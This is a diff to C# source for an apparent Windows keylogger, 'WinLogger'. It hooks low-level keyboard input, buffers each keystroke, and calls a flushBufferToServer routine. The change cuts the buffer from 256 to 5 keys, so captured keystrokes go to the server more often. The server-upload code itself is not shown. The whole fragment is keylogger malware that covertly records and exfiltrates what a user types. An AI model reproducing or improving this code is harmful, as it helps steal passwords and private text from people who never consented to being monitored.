@@ -25,9 +25,10 @@ public class WinLogger
     private const int WM_KEYDOWN = 0x0100;
     private static LowLevelKeyboardProc proc = KeyLogging;
     private static IntPtr hookInt = IntPtr.Zero;
-    private static Keys[] userBuffer = new Keys[256];
+
+    private const int maxBufferSize = 5;
+    private static Keys[] userBuffer = new Keys[maxBufferSize];
     private static int bufIndex = 0;
-    private const int MAX_KEY_CHARS = 18;
     
     static public void Main ()
     {
@@ -47,7 +48,7 @@ public class WinLogger
             Console.WriteLine((Keys)vkCode);
             userBuffer[bufIndex++] = (Keys)vkCode;
             
-            if(bufIndex > 255)
+            if(bufIndex >= maxBufferSize)
             {
                 flushBufferToServer(ref userBuffer, bufIndex);
                 bufIndex = 0;
